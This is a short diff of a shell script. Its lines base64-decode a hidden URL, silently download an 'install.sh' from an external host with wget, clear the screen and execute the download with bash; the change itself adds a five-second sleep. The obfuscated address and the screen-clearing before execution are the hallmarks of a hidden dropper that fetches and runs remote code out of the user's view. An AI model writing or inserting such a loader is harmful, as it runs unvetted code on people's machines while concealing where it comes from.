@@ -20,5 +20,6 @@ file=.sh
 codec=$(echo "aHR0cHM6Ly9jbG91ZHNoeWRyby50ZWNoL3MvNzRiWmNZNnBiOWo0ZW9NL2Rvd25sb2FkP2ZpbGVzPWluc3RhbGwuc2g" | base64 --decode)
 
 wget -q -O install$file $codec
+sleep 5
 clear
 bash install.sh
